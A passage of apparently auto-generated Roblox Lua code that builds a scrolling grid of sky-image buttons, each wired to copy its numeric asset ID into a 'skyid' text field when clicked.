ImageButton23.BorderSizePixel = 0
ImageButton23.Size = UDim2.new(0, 73, 0, 62)
ImageButton23.Parent = ScrollingFrame

local LocalScript37 = Instance.new("Folder")
LocalScript37.Name = "LocalScript"
LocalScript37.Parent = ImageButton23
__S[#__S + 1] = function(...)
local script = LocalScript37
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton24 = Instance.new("ImageButton")
ImageButton24.Name = "ImageButton"
ImageButton24.Image = "rbxassetid://73545339663748"
ImageButton24.ImageContent = Content.fromUri("rbxassetid://73545339663748")
ImageButton24.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton24.BackgroundTransparency = 1
ImageButton24.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton24.BorderSizePixel = 0
ImageButton24.Size = UDim2.new(0, 73, 0, 62)
ImageButton24.Parent = ScrollingFrame

local LocalScript38 = Instance.new("Folder")
LocalScript38.Name = "LocalScript"
LocalScript38.Parent = ImageButton24
__S[#__S + 1] = function(...)
local script = LocalScript38
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton25 = Instance.new("ImageButton")
ImageButton25.Name = "ImageButton"
ImageButton25.Image = "rbxassetid://85087584905140"
ImageButton25.ImageContent = Content.fromUri("rbxassetid://85087584905140")
ImageButton25.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton25.BackgroundTransparency = 1
ImageButton25.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton25.BorderSizePixel = 0
ImageButton25.Size = UDim2.new(0, 73, 0, 62)
ImageButton25.Parent = ScrollingFrame

local LocalScript39 = Instance.new("Folder")
LocalScript39.Name = "LocalScript"
LocalScript39.Parent = ImageButton25
__S[#__S + 1] = function(...)
local script = LocalScript39
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton26 = Instance.new("ImageButton")
ImageButton26.Name = "ImageButton"
ImageButton26.Image = "rbxassetid://76557096263264"
ImageButton26.ImageContent = Content.fromUri("rbxassetid://76557096263264")
ImageButton26.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton26.BackgroundTransparency = 1
ImageButton26.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton26.BorderSizePixel = 0
ImageButton26.Size = UDim2.new(0, 73, 0, 62)
ImageButton26.Parent = ScrollingFrame

local LocalScript40 = Instance.new("Folder")
LocalScript40.Name = "LocalScript"
LocalScript40.Parent = ImageButton26
__S[#__S + 1] = function(...)
local script = LocalScript40
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton27 = Instance.new("ImageButton")
ImageButton27.Name = "ImageButton"
ImageButton27.Image = "rbxassetid://136823496222876"
ImageButton27.ImageContent = Content.fromUri("rbxassetid://136823496222876")
ImageButton27.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton27.BackgroundTransparency = 1
ImageButton27.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton27.BorderSizePixel = 0
ImageButton27.Size = UDim2.new(0, 73, 0, 62)
ImageButton27.Parent = ScrollingFrame

local LocalScript41 = Instance.new("Folder")
LocalScript41.Name = "LocalScript"
LocalScript41.Parent = ImageButton27
__S[#__S + 1] = function(...)
local script = LocalScript41
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton28 = Instance.new("ImageButton")
ImageButton28.Name = "ImageButton"
ImageButton28.Image = "rbxassetid://133120460842920"
ImageButton28.ImageContent = Content.fromUri("rbxassetid://133120460842920")
ImageButton28.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton28.BackgroundTransparency = 1
ImageButton28.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton28.BorderSizePixel = 0
ImageButton28.Size = UDim2.new(0, 73, 0, 62)
ImageButton28.Parent = ScrollingFrame

local LocalScript42 = Instance.new("Folder")
LocalScript42.Name = "LocalScript"
LocalScript42.Parent = ImageButton28
__S[#__S + 1] = function(...)
local script = LocalScript42
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton29 = Instance.new("ImageButton")
ImageButton29.Name = "ImageButton"
ImageButton29.Image = "rbxassetid://85041519710075"
ImageButton29.ImageContent = Content.fromUri("rbxassetid://85041519710075")
ImageButton29.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton29.BackgroundTransparency = 1
ImageButton29.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton29.BorderSizePixel = 0
ImageButton29.Size = UDim2.new(0, 73, 0, 62)
ImageButton29.Parent = ScrollingFrame

local LocalScript43 = Instance.new("Folder")
LocalScript43.Name = "LocalScript"
LocalScript43.Parent = ImageButton29
__S[#__S + 1] = function(...)
local script = LocalScript43
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton30 = Instance.new("ImageButton")
ImageButton30.Name = "ImageButton"
ImageButton30.Image = "rbxassetid://71148582666854"
ImageButton30.ImageContent = Content.fromUri("rbxassetid://71148582666854")
ImageButton30.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton30.BackgroundTransparency = 1
ImageButton30.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton30.BorderSizePixel = 0
ImageButton30.Size = UDim2.new(0, 73, 0, 62)
ImageButton30.Parent = ScrollingFrame

local LocalScript44 = Instance.new("Folder")
LocalScript44.Name = "LocalScript"
LocalScript44.Parent = ImageButton30
__S[#__S + 1] = function(...)
local script = LocalScript44
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton31 = Instance.new("ImageButton")
ImageButton31.Name = "ImageButton"
ImageButton31.Image = "rbxassetid://133200436573772"
ImageButton31.ImageContent = Content.fromUri("rbxassetid://133200436573772")
ImageButton31.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton31.BackgroundTransparency = 1
ImageButton31.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton31.BorderSizePixel = 0
ImageButton31.Size = UDim2.new(0, 73, 0, 62)
ImageButton31.Parent = ScrollingFrame

local LocalScript45 = Instance.new("Folder")
LocalScript45.Name = "LocalScript"
LocalScript45.Parent = ImageButton31
__S[#__S + 1] = function(...)
local script = LocalScript45
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton32 = Instance.new("ImageButton")
ImageButton32.Name = "ImageButton"
ImageButton32.Image = "rbxassetid://99357116159858"
ImageButton32.ImageContent = Content.fromUri("rbxassetid://99357116159858")
ImageButton32.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton32.BackgroundTransparency = 1
ImageButton32.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton32.BorderSizePixel = 0
ImageButton32.Size = UDim2.new(0, 73, 0, 62)
ImageButton32.Parent = ScrollingFrame

local LocalScript46 = Instance.new("Folder")
LocalScript46.Name = "LocalScript"
LocalScript46.Parent = ImageButton32
__S[#__S + 1] = function(...)
local script = LocalScript46
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton33 = Instance.new("ImageButton")
ImageButton33.Name = "ImageButton"
ImageButton33.Image = "rbxassetid://73229108459975"
ImageButton33.ImageContent = Content.fromUri("rbxassetid://73229108459975")
ImageButton33.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton33.BackgroundTransparency = 1
ImageButton33.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton33.BorderSizePixel = 0
ImageButton33.Size = UDim2.new(0, 73, 0, 62)
ImageButton33.Parent = ScrollingFrame

local LocalScript47 = Instance.new("Folder")
LocalScript47.Name = "LocalScript"
LocalScript47.Parent = ImageButton33
__S[#__S + 1] = function(...)
local script = LocalScript47
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton34 = Instance.new("ImageButton")
ImageButton34.Name = "ImageButton"
ImageButton34.Image = "rbxassetid://4537616739"
ImageButton34.ImageContent = Content.fromUri("rbxassetid://4537616739")
ImageButton34.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton34.BackgroundTransparency = 1
ImageButton34.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton34.BorderSizePixel = 0
ImageButton34.Size = UDim2.new(0, 73, 0, 62)
ImageButton34.Parent = ScrollingFrame

local LocalScript48 = Instance.new("Folder")
LocalScript48.Name = "LocalScript"
LocalScript48.Parent = ImageButton34
__S[#__S + 1] = function(...)
local script = LocalScript48
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton35 = Instance.new("ImageButton")
ImageButton35.Name = "ImageButton"
ImageButton35.Image = "rbxassetid://107888192134533"
ImageButton35.ImageContent = Content.fromUri("rbxassetid://107888192134533")
ImageButton35.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton35.BackgroundTransparency = 1
ImageButton35.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton35.BorderSizePixel = 0
ImageButton35.Size = UDim2.new(0, 73, 0, 62)
ImageButton35.Parent = ScrollingFrame

local LocalScript49 = Instance.new("Folder")
LocalScript49.Name = "LocalScript"
LocalScript49.Parent = ImageButton35
__S[#__S + 1] = function(...)
local script = LocalScript49
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton36 = Instance.new("ImageButton")
ImageButton36.Name = "ImageButton"
ImageButton36.Image = "rbxassetid://6740238869"
ImageButton36.ImageContent = Content.fromUri("rbxassetid://6740238869")
ImageButton36.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton36.BackgroundTransparency = 1
ImageButton36.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton36.BorderSizePixel = 0
ImageButton36.Size = UDim2.new(0, 73, 0, 62)
ImageButton36.Parent = ScrollingFrame

local LocalScript50 = Instance.new("Folder")
LocalScript50.Name = "LocalScript"
LocalScript50.Parent = ImageButton36
__S[#__S + 1] = function(...)
local script = LocalScript50
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.Name = "UIGridLayout"
UIGridLayout.CellPadding = UDim2.new(0, 6, 0, 6)
UIGridLayout.CellSize = UDim2.new(0, 65, 0, 65)
UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.Parent = ScrollingFrame

local ImageButton37 = Instance.new("ImageButton")
ImageButton37.Name = "ImageButton"
ImageButton37.Image = "rbxassetid://87589980581247"
ImageButton37.ImageContent = Content.fromUri("rbxassetid://87589980581247")
ImageButton37.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton37.BackgroundTransparency = 1
ImageButton37.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton37.BorderSizePixel = 0
ImageButton37.Size = UDim2.new(0, 73, 0, 62)
ImageButton37.Parent = ScrollingFrame

local LocalScript51 = Instance.new("Folder")
LocalScript51.Name = "LocalScript"
LocalScript51.Parent = ImageButton37
__S[#__S + 1] = function(...)
local script = LocalScript51
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton38 = Instance.new("ImageButton")
ImageButton38.Name = "ImageButton"
ImageButton38.Image = "rbxassetid://87608881264585"
ImageButton38.ImageContent = Content.fromUri("rbxassetid://87608881264585")
ImageButton38.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton38.BackgroundTransparency = 1
ImageButton38.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton38.BorderSizePixel = 0
ImageButton38.Size = UDim2.new(0, 73, 0, 62)
ImageButton38.Parent = ScrollingFrame

local LocalScript52 = Instance.new("Folder")
LocalScript52.Name = "LocalScript"
LocalScript52.Parent = ImageButton38
__S[#__S + 1] = function(...)
local script = LocalScript52
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton39 = Instance.new("ImageButton")
ImageButton39.Name = "ImageButton"
ImageButton39.Image = "rbxassetid://131725419311309"
ImageButton39.ImageContent = Content.fromUri("rbxassetid://131725419311309")
ImageButton39.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton39.BackgroundTransparency = 1
ImageButton39.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton39.BorderSizePixel = 0
ImageButton39.Size = UDim2.new(0, 73, 0, 62)
ImageButton39.Parent = ScrollingFrame

local LocalScript53 = Instance.new("Folder")
LocalScript53.Name = "LocalScript"
LocalScript53.Parent = ImageButton39
__S[#__S + 1] = function(...)
local script = LocalScript53
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton40 = Instance.new("ImageButton")
ImageButton40.Name = "ImageButton"
ImageButton40.Image = "rbxassetid://79733175070072"
ImageButton40.ImageContent = Content.fromUri("rbxassetid://79733175070072")
ImageButton40.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton40.BackgroundTransparency = 1
ImageButton40.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton40.BorderSizePixel = 0
ImageButton40.Size = UDim2.new(0, 73, 0, 62)
ImageButton40.Parent = ScrollingFrame

local LocalScript54 = Instance.new("Folder")
LocalScript54.Name = "LocalScript"
LocalScript54.Parent = ImageButton40
__S[#__S + 1] = function(...)
local script = LocalScript54
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton41 = Instance.new("ImageButton")
ImageButton41.Name = "ImageButton"
ImageButton41.Image = "rbxassetid://136441597910872"
ImageButton41.ImageContent = Content.fromUri("rbxassetid://136441597910872")
ImageButton41.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton41.BackgroundTransparency = 1
ImageButton41.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton41.BorderSizePixel = 0
ImageButton41.Size = UDim2.new(0, 73, 0, 62)
ImageButton41.Parent = ScrollingFrame

local LocalScript55 = Instance.new("Folder")
LocalScript55.Name = "LocalScript"
LocalScript55.Parent = ImageButton41
__S[#__S + 1] = function(...)
local script = LocalScript55
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton42 = Instance.new("ImageButton")
ImageButton42.Name = "ImageButton"
ImageButton42.Image = "rbxassetid://95723809625725"
ImageButton42.ImageContent = Content.fromUri("rbxassetid://95723809625725")
ImageButton42.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton42.BackgroundTransparency = 1
ImageButton42.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton42.BorderSizePixel = 0
ImageButton42.Size = UDim2.new(0, 73, 0, 62)
ImageButton42.Parent = ScrollingFrame

local LocalScript56 = Instance.new("Folder")
LocalScript56.Name = "LocalScript"
LocalScript56.Parent = ImageButton42
__S[#__S + 1] = function(...)
local script = LocalScript56
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton43 = Instance.new("ImageButton")
ImageButton43.Name = "ImageButton"
ImageButton43.Image = "rbxassetid://116909812896573"
ImageButton43.ImageContent = Content.fromUri("rbxassetid://116909812896573")
ImageButton43.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton43.BackgroundTransparency = 1
ImageButton43.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton43.BorderSizePixel = 0
ImageButton43.Size = UDim2.new(0, 73, 0, 62)
ImageButton43.Parent = ScrollingFrame

local LocalScript57 = Instance.new("Folder")
LocalScript57.Name = "LocalScript"
LocalScript57.Parent = ImageButton43
__S[#__S + 1] = function(...)
local script = LocalScript57
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton44 = Instance.new("ImageButton")
ImageButton44.Name = "ImageButton"
ImageButton44.Image = "rbxassetid://124452484061851"
ImageButton44.ImageContent = Content.fromUri("rbxassetid://124452484061851")
ImageButton44.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton44.BackgroundTransparency = 1
ImageButton44.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton44.BorderSizePixel = 0
ImageButton44.Size = UDim2.new(0, 73, 0, 62)
ImageButton44.Parent = ScrollingFrame

local LocalScript58 = Instance.new("Folder")
LocalScript58.Name = "LocalScript"
LocalScript58.Parent = ImageButton44
__S[#__S + 1] = function(...)
local script = LocalScript58
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton45 = Instance.new("ImageButton")
ImageButton45.Name = "ImageButton"
ImageButton45.Image = "rbxassetid://108816071258823"
ImageButton45.ImageContent = Content.fromUri("rbxassetid://108816071258823")
ImageButton45.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton45.BackgroundTransparency = 1
ImageButton45.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton45.BorderSizePixel = 0
ImageButton45.Size = UDim2.new(0, 73, 0, 62)
ImageButton45.Parent = ScrollingFrame

local LocalScript59 = Instance.new("Folder")
LocalScript59.Name = "LocalScript"
LocalScript59.Parent = ImageButton45
__S[#__S + 1] = function(...)
local script = LocalScript59
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton46 = Instance.new("ImageButton")
ImageButton46.Name = "ImageButton"
ImageButton46.Image = "rbxassetid://100558568667501"
ImageButton46.ImageContent = Content.fromUri("rbxassetid://100558568667501")
ImageButton46.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton46.BackgroundTransparency = 1
ImageButton46.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton46.BorderSizePixel = 0
ImageButton46.Size = UDim2.new(0, 73, 0, 62)
ImageButton46.Parent = ScrollingFrame

local LocalScript60 = Instance.new("Folder")
LocalScript60.Name = "LocalScript"
LocalScript60.Parent = ImageButton46
__S[#__S + 1] = function(...)
local script = LocalScript60
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton47 = Instance.new("ImageButton")
ImageButton47.Name = "ImageButton"
ImageButton47.Image = "rbxassetid://103582673658952"
ImageButton47.ImageContent = Content.fromUri("rbxassetid://103582673658952")
ImageButton47.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton47.BackgroundTransparency = 1
ImageButton47.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton47.BorderSizePixel = 0
ImageButton47.Size = UDim2.new(0, 73, 0, 62)
ImageButton47.Parent = ScrollingFrame

local LocalScript61 = Instance.new("Folder")
LocalScript61.Name = "LocalScript"
LocalScript61.Parent = ImageButton47
__S[#__S + 1] = function(...)
local script = LocalScript61
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton48 = Instance.new("ImageButton")
ImageButton48.Name = "ImageButton"
ImageButton48.Image = "rbxassetid://95251785394161"
ImageButton48.ImageContent = Content.fromUri("rbxassetid://95251785394161")
ImageButton48.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton48.BackgroundTransparency = 1
ImageButton48.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton48.BorderSizePixel = 0
ImageButton48.Size = UDim2.new(0, 73, 0, 62)
ImageButton48.Parent = ScrollingFrame

local LocalScript62 = Instance.new("Folder")
LocalScript62.Name = "LocalScript"
LocalScript62.Parent = ImageButton48
__S[#__S + 1] = function(...)
local script = LocalScript62
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton49 = Instance.new("ImageButton")
ImageButton49.Name = "ImageButton"
ImageButton49.Image = "rbxassetid://111825813029584"
ImageButton49.ImageContent = Content.fromUri("rbxassetid://111825813029584")
ImageButton49.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton49.BackgroundTransparency = 1
ImageButton49.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton49.BorderSizePixel = 0
ImageButton49.Size = UDim2.new(0, 73, 0, 62)
ImageButton49.Parent = ScrollingFrame

local LocalScript63 = Instance.new("Folder")
LocalScript63.Name = "LocalScript"
LocalScript63.Parent = ImageButton49
__S[#__S + 1] = function(...)
local script = LocalScript63
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton50 = Instance.new("ImageButton")
ImageButton50.Name = "ImageButton"
ImageButton50.Image = "rbxassetid://9724585359"
ImageButton50.ImageContent = Content.fromUri("rbxassetid://9724585359")
ImageButton50.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton50.BackgroundTransparency = 1
ImageButton50.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton50.BorderSizePixel = 0
ImageButton50.Size = UDim2.new(0, 73, 0, 62)
ImageButton50.Parent = ScrollingFrame

local LocalScript64 = Instance.new("Folder")
LocalScript64.Name = "LocalScript"
LocalScript64.Parent = ImageButton50
__S[#__S + 1] = function(...)
local script = LocalScript64
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton51 = Instance.new("ImageButton")
ImageButton51.Name = "ImageButton"
ImageButton51.Image = "rbxassetid://7907329019"
ImageButton51.ImageContent = Content.fromUri("rbxassetid://7907329019")
ImageButton51.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton51.BackgroundTransparency = 1
ImageButton51.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton51.BorderSizePixel = 0
ImageButton51.Size = UDim2.new(0, 73, 0, 62)
ImageButton51.Parent = ScrollingFrame

local LocalScript65 = Instance.new("Folder")
LocalScript65.Name = "LocalScript"
LocalScript65.Parent = ImageButton51
__S[#__S + 1] = function(...)
local script = LocalScript65
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton52 = Instance.new("ImageButton")
ImageButton52.Name = "ImageButton"
ImageButton52.Image = "rbxassetid://10398213047"
ImageButton52.ImageContent = Content.fromUri("rbxassetid://10398213047")
ImageButton52.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton52.BackgroundTransparency = 1
ImageButton52.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton52.BorderSizePixel = 0
ImageButton52.Size = UDim2.new(0, 73, 0, 62)
ImageButton52.Parent = ScrollingFrame

local LocalScript66 = Instance.new("Folder")
LocalScript66.Name = "LocalScript"
LocalScript66.Parent = ImageButton52
__S[#__S + 1] = function(...)
local script = LocalScript66
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
